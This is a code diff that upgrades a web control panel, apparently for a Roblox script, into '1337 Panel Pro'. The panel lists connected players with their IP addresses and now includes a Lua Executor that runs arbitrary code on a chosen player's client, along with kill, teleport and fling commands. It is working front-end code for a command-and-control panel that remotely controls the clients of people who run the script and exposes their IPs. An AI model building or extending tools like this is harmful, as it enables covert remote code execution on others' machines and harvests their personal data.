@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 1337 Panel</title>
+    <title>🎮 1337 Panel Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/lua/lua.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap');
 
@@ -39,7 +43,7 @@
         }
 
         .container {
-            max-width: 1600px;
+            max-width: 1800px;
             margin: 0 auto;
         }
 
@@ -112,26 +116,10 @@
             overflow: hidden;
         }
 
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
         .stat-card:hover {
             transform: translateY(-5px);
             border-color: var(--accent-primary);
             box-shadow: 0 10px 40px rgba(0, 255, 136, 0.3);
-        }
-
-        .stat-card:hover::before {
-            opacity: 1;
         }
 
         .stat-card h3 {
@@ -150,7 +138,7 @@
 
         .players-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
             gap: 25px;
         }
 
@@ -162,21 +150,6 @@
             transition: all 0.4s;
             position: relative;
             overflow: hidden;
-        }
-
-        .player-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 50%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.05), transparent);
-            transition: left 0.5s;
-        }
-
-        .player-card:hover::before {
-            left: 100%;
         }
 
         .player-card:hover {
@@ -215,7 +188,6 @@
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 1px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
             animation: pulse 2s infinite;
         }
 
@@ -285,24 +257,6 @@
             font-family: 'JetBrains Mono', monospace;
             position: relative;
             overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.5s, height 0.5s;
-        }
-
-        .btn:hover::before {
-            width: 300px;
-            height: 300px;
         }
 
         .btn:hover {
@@ -383,6 +337,10 @@
             animation: modalSlideIn 0.3s;
         }
 
+        .modal-content.large {
+            max-width: 800px;
+        }
+
         @keyframes modalSlideIn {
             from {
                 transform: translateY(-50px);
@@ -402,7 +360,7 @@
             letter-spacing: 2px;
         }
 
-        .modal-content input {
+        .modal-content input, .modal-content textarea {
             width: 100%;
             padding: 15px;
             background: var(--bg-card);
@@ -415,13 +373,13 @@
             transition: all 0.3s;
         }
 
-        .modal-content input:focus {
+        .modal-content input:focus, .modal-content textarea:focus {
             outline: none;
             border-color: var(--accent-primary);
             box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
         }
 
-        .modal-content input::placeholder {
+        .modal-content input::placeholder, .modal-content textarea::placeholder {
             color: var(--text-secondary);
         }
 
@@ -435,42 +393,6 @@
             padding: 15px;
         }
 
-        .empty-state {
-            text-align: center;
-            padding: 80px 40px;
-            background: var(--bg-card);
-            border: 2px solid rgba(0, 255, 136, 0.2);
-            border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-        }
-
-        .empty-state h2 {
-            color: var(--accent-primary);
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-        }
-
-        .empty-state p {
-            color: var(--text-secondary);
-            font-size: 1.1em;
-            line-height: 1.6;
-        }
-
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(0, 255, 136, 0.2);
-            border-top-color: var(--accent-primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         .section-title {
             color: var(--accent-primary);
             font-size: 1.2em;
@@ -479,6 +401,35 @@
             letter-spacing: 2px;
             border-left: 4px solid var(--accent-primary);
             padding-left: 15px;
+        }
+
+        .CodeMirror {
+            height: 400px;
+            border: 2px solid rgba(0, 255, 136, 0.2);
+            border-radius: 10px;
+            font-size: 14px;
+        }
+
+        .output-box {
+            background: var(--bg-card);
+            border: 2px solid rgba(0, 255, 136, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            min-height: 100px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text-primary);
+            margin-top: 15px;
+        }
+
+        .output-success {
+            color: var(--accent-primary);
+        }
+
+        .output-error {
+            color: var(--accent-danger);
         }
 
         @media (max-width: 768px) {
@@ -500,8 +451,8 @@
     <div class="container">
         <header>
             <div class="header-content">
-                <h1>⚡ 1337 PANEL ⚡</h1>
-                <p class="subtitle">🎮 Advanced Roblox Control System</p>
+                <h1>⚡ 1337 PANEL PRO ⚡</h1>
+                <p class="subtitle">🎮 Advanced Roblox Control System with Lua Executor</p>
                 <div class="stats">
                     <div class="stat-card">
                         <h3 id="onlineCount">0</h3>
@@ -522,6 +473,7 @@
         <div id="playersContainer" class="players-grid"></div>
     </div>
 
+    <!-- Modals existants -->
     <div id="kickModal" class="modal">
         <div class="modal-content">
             <h3>🚪 Kick Player</h3>
@@ -589,15 +541,58 @@
         </div>
     </div>
 
+    <!-- NOUVEAU: Modal Lua Executor -->
+    <div id="luaModal" class="modal">
+        <div class="modal-content large">
+            <h3>💻 LUA EXECUTOR</h3>
+            <div id="luaEditorContainer"></div>
+            <div id="luaOutput" class="output-box" style="display: none;">
+                <strong>Output:</strong><br>
+                <span id="luaOutputText"></span>
+            </div>
+            <div class="modal-buttons" style="margin-top: 20px;">
+                <button class="btn btn-success" onclick="executeLua()">▶️ Execute</button>
+                <button class="btn btn-warning" onclick="clearLuaEditor()">🗑️ Clear</button>
+                <button class="btn btn-info" onclick="closeModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOUVEAU: Modal Jump Power -->
+    <div id="jumpModal" class="modal">
+        <div class="modal-content">
+            <h3>⬆️ Set Jump Power</h3>
+            <input type="number" id="jumpValue" placeholder="Jump power (default: 50)" />
+            <div class="modal-buttons">
+                <button class="btn btn-success" onclick="confirmJump()">Set</button>
+                <button class="btn btn-info" onclick="closeModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOUVEAU: Modal Teleport -->
+    <div id="teleportModal" class="modal">
+        <div class="modal-content">
+            <h3>🌀 Teleport Player</h3>
+            <input type="number" id="teleportX" placeholder="X Position" />
+            <input type="number" id="teleportY" placeholder="Y Position (height)" />
+            <input type="number" id="teleportZ" placeholder="Z Position" />
+            <div class="modal-buttons">
+                <button class="btn btn-success" onclick="confirmTeleport()">Teleport</button>
+                <button class="btn btn-info" onclick="closeModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
     <div id="chatModal" class="modal">
         <div class="modal-content" style="max-width: 600px; max-height: 80vh;">
-            <h3 id="chatTitle">💀 ADMIN CHAT</h3>
+            <h3 id="chatTitle">👁️ ADMIN CHAT</h3>
             <div id="chatHistory" style="height: 400px; overflow-y: auto; background: var(--bg-card); border: 2px solid rgba(0,255,136,0.2); border-radius: 10px; padding: 15px; margin-bottom: 15px;">
                 <p style="color: var(--text-secondary); text-align: center;">Loading chat history...</p>
             </div>
             <input type="text" id="chatMessageInput" placeholder="Type your message..." style="margin-bottom: 10px;" />
             <div class="modal-buttons">
-                <button class="btn btn-success" onclick="sendChatMessage()">💀 SEND</button>
+                <button class="btn btn-success" onclick="sendChatMessage()">👁️ SEND</button>
                 <button class="btn btn-info" onclick="closeModal()">Close</button>
             </div>
         </div>
@@ -608,6 +603,24 @@
         let currentUsername = null;
         let commandsSent = 0;
         let chatUpdateInterval = null;
+        let luaEditor = null;
+
+        // Initialiser CodeMirror pour l'éditeur Lua
+        function initLuaEditor() {
+            if (!luaEditor) {
+                luaEditor = CodeMirror(document.getElementById('luaEditorContainer'), {
+                    mode: 'lua',
+                    theme: 'dracula',
+                    lineNumbers: true,
+                    autoCloseBrackets: true,
+                    matchBrackets: true,
+                    indentUnit: 4,
+                    tabSize: 4,
+                    lineWrapping: true,
+                    value: '-- Write your Lua code here\nprint("Hello from 1337 Panel!")'
+                });
+            }
+        }
 
         async function sendCommand(userid, command, data = {}) {
             try {
@@ -668,7 +681,7 @@
         function openChatModal(userid, username) {
             currentUserId = userid;
             currentUsername = username;
-            document.getElementById('chatTitle').textContent = `💀 CHAT WITH ${username}`;
+            document.getElementById('chatTitle').textContent = `👁️ CHAT WITH ${username}`;
             document.getElementById('chatModal').classList.add('active');
             loadChatHistory(userid);
             
@@ -693,6 +706,63 @@
                 sendChatMessage();
             }
         });
+
+        // NOUVEAU: Fonctions pour le Lua Executor
+        function openLuaModal(userid, username) {
+            currentUserId = userid;
+            currentUsername = username;
+            initLuaEditor();
+            document.getElementById('luaModal').classList.add('active');
+            document.getElementById('luaOutput').style.display = 'none';
+        }
+
+        function clearLuaEditor() {
+            if (luaEditor) {
+                luaEditor.setValue('-- Write your Lua code here\n');
+            }
+            document.getElementById('luaOutput').style.display = 'none';
+        }
+
+        async function executeLua() {
+            if (!luaEditor || !currentUserId) return;
+            
+            const code = luaEditor.getValue();
+            const outputDiv = document.getElementById('luaOutput');
+            const outputText = document.getElementById('luaOutputText');
+            
+            outputDiv.style.display = 'block';
+            outputText.innerHTML = '<span style="color: var(--accent-warning);">⏳ Executing...</span>';
+            
+            try {
+                await sendCommand(currentUserId, 'exec', { luaCode: code });
+                
+                // Attendre le résultat
+                let attempts = 0;
+                const checkResult = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) {
+                        clearInterval(checkResult);
+                        outputText.innerHTML = '<span class="output-error">❌ Timeout: No response from client</span>';
+                        return;
+                    }
+                    
+                    const response = await fetch(`/exec-result/${currentUserId}`);
+                    const data = await response.json();
+                    
+                    if (data.hasResult !== false) {
+                        clearInterval(checkResult);
+                        if (data.success) {
+                            outputText.innerHTML = `<span class="output-success">✅ Success:\n${data.result || 'Code executed successfully'}</span>`;
+                        } else {
+                            outputText.innerHTML = `<span class="output-error">❌ Error:\n${data.error || 'Unknown error'}</span>`;
+                        }
+                    }
+                }, 500);
+                
+            } catch (error) {
+                outputText.innerHTML = `<span class="output-error">❌ Error: ${error.message}</span>`;
+            }
+        }
 
         function openKickModal(userid) {
             currentUserId = userid;
@@ -722,6 +792,16 @@
         function openImageModal(userid) {
             currentUserId = userid;
             document.getElementById('imageModal').classList.add('active');
+        }
+
+        function openJumpModal(userid) {
+            currentUserId = userid;
+            document.getElementById('jumpModal').classList.add('active');
+        }
+
+        function openTeleportModal(userid) {
+            currentUserId = userid;
+            document.getElementById('teleportModal').classList.add('active');
         }
 
         function closeModal() {
@@ -778,6 +858,26 @@
             closeModal();
         }
 
+        function confirmJump() {
+            const power = document.getElementById('jumpValue').value || 50;
+            sendCommand(currentUserId, 'setjump', { power: parseInt(power) });
+            closeModal();
+        }
+
+        function confirmTeleport() {
+            const x = document.getElementById('teleportX').value;
+            const y = document.getElementById('teleportY').value;
+            const z = document.getElementById('teleportZ').value;
+            if (x && y && z) {
+                sendCommand(currentUserId, 'teleport', { 
+                    x: parseFloat(x), 
+                    y: parseFloat(y), 
+                    z: parseFloat(z) 
+                });
+            }
+            closeModal();
+        }
+
         async function loadPlayers() {
             try {
                 const response = await fetch('/players');
@@ -785,7 +885,7 @@
                 const container = document.getElementById('playersContainer');
                 
                 if (players.length === 0) {
-                    container.innerHTML = '<div class="empty-state" style="grid-column: 1/-1;"><div class="loading-spinner"></div><h2>🌐 Awaiting Connections</h2><p>Players will appear here once they execute the script</p></div>';
+                    container.innerHTML = '<div class="empty-state" style="grid-column: 1/-1; text-align: center; padding: 80px;"><h2>🌐 Awaiting Connections</h2><p>Players will appear here once they execute the script</p></div>';
                 } else {
                     container.innerHTML = players.map(p => {
                         const userid = p.userid;
@@ -809,14 +909,21 @@
                                 <div class="detail-row"><span class="detail-label">⚡ Executor</span><span class="detail-value">${executor}</span></div>
                                 <div class="detail-row"><span class="detail-label">🌐 IP</span><span class="detail-value">${ip}</span></div>
                             </div>
-                            <div style="margin-bottom: 15px;"><div class="section-title">🎯 Player Control</div></div>
+                            <div style="margin-bottom: 15px;"><div class="section-title">💻 EXECUTE LUA</div></div>
+                            <div class="controls">
+                                <button class="btn btn-purple btn-full" onclick="openLuaModal('${userid}', '${username}')">💻 Lua Executor</button>
+                            </div>
+                            <div style="margin: 20px 0 15px;"><div class="section-title">🎯 Player Control</div></div>
                             <div class="controls">
                                 <button class="btn btn-danger" onclick="openKickModal('${userid}')">🚪 Kick</button>
                                 <button class="btn btn-warning" onclick="sendCommand('${userid}', 'freeze')">❄️ Freeze</button>
                                 <button class="btn btn-success" onclick="sendCommand('${userid}', 'unfreeze')">🔥 Unfreeze</button>
                                 <button class="btn btn-info" onclick="sendCommand('${userid}', 'jump')">⬆️ Jump</button>
+                                <button class="btn btn-purple" onclick="openJumpModal('${userid}')">🦘 Jump Power</button>
+                                <button class="btn btn-info" onclick="sendCommand('${userid}', 'resetjump')">🔄 Reset Jump</button>
                                 <button class="btn btn-purple" onclick="sendCommand('${userid}', 'spin')">🌀 Spin</button>
                                 <button class="btn btn-info" onclick="sendCommand('${userid}', 'unspin')">⏸️ Unspin</button>
+                                <button class="btn btn-success" onclick="openFlingModal('${userid}')">🚀 Fling</button>
                             </div>
                             <div style="margin: 20px 0 15px;"><div class="section-title">✨ Visual Effects</div></div>
                             <div class="controls">
@@ -826,19 +933,24 @@
                                 <button class="btn btn-success" onclick="sendCommand('${userid}', 'uninvisible')">👁️ Visible</button>
                                 <button class="btn btn-danger" onclick="sendCommand('${userid}', 'explode')">💥 Explode</button>
                                 <button class="btn btn-success" onclick="openSoundModal('${userid}')">🔊 Sound</button>
+                                <button class="btn btn-warning" onclick="sendCommand('${userid}', 'stopsound')">🔇 Stop Sound</button>
+                                <button class="btn btn-pink" onclick="openImageModal('${userid}')">🖼️ Image</button>
+                                <button class="btn btn-info" onclick="sendCommand('${userid}', 'removeimage')">🗑️ Remove Image</button>
                             </div>
                             <div style="margin: 20px 0 15px;"><div class="section-title">⚙️ Advanced</div></div>
                             <div class="controls">
-                                <button class="btn btn-warning btn-full" onclick="sendCommand('${userid}', 'stopsound')">🔇 Stop Sound</button>
                                 <button class="btn btn-info" onclick="openSpeedModal('${userid}')">⚡ Speed</button>
-                                <button class="btn btn-info" onclick="sendCommand('${userid}', 'resetspeed')">🔄 Reset</button>
+                                <button class="btn btn-info" onclick="sendCommand('${userid}', 'resetspeed')">🔄 Reset Speed</button>
                                 <button class="btn btn-purple" onclick="sendCommand('${userid}', 'god')">🛡️ God</button>
                                 <button class="btn btn-warning" onclick="sendCommand('${userid}', 'ungod')">❤️ Ungod</button>
-                                <button class="btn btn-success" onclick="openFlingModal('${userid}')">🚀 Fling</button>
                                 <button class="btn btn-purple" onclick="sendCommand('${userid}', 'noclip')">👻 Noclip</button>
                                 <button class="btn btn-warning" onclick="sendCommand('${userid}', 'clipon')">🧱 Clip On</button>
+                                <button class="btn btn-info" onclick="openTeleportModal('${userid}')">🌀 Teleport</button>
+                                <button class="btn btn-success" onclick="sendCommand('${userid}', 'sit')">💺 Sit</button>
+                                <button class="btn btn-info" onclick="sendCommand('${userid}', 'unsit')">🚶 Stand</button>
                                 <button class="btn btn-info" onclick="openMessageModal('${userid}')">💬 Message</button>
-                                <button class="btn btn-pink" onclick="openChatModal('${userid}', '${username}')">💀 Chat</button>
+                                <button class="btn btn-pink" onclick="openChatModal('${userid}', '${username}')">👁️ Chat</button>
+                                <button class="btn btn-danger btn-full" onclick="sendCommand('${userid}', 'kill')">☠️ KILL PLAYER</button>
                             </div>
                         </div>
                         `;
